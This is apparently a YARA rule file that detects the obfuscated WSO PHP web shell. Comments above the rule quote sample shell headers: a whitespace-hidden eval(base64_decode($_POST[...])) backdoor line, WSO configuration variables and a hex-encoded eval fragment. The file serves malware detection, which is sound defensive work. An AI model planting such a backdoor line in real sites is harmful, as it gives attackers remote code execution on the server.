// Example one:
/*
<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nd7c9ee']));?><?php
$auth_pass = "63a9f0ea7bb98050796b649e85481845";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
...
preg_replace(...
...
\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28...
*/

// Example two:
/*
<?php
$auth_pass = "";
$color = "#df5";
$default_action = base64_decode('RmlsZXNNYW4=');
*/

rule other_wso_php_shell_obfuscated_v1: phpshell
{
    meta:
        description = "default obfuscated wso shell"
        author = "delyee"
        reference = "https://github.com/delyee/yara_rules"
        date = "12.03.2020"
    strings:
        $ = "$auth_pass"
        $ = "$color"
        $ = "$default_action"
        $ = "$default_use_ajax"
        $ = "$default_charset"
    condition:
        4 of them
}
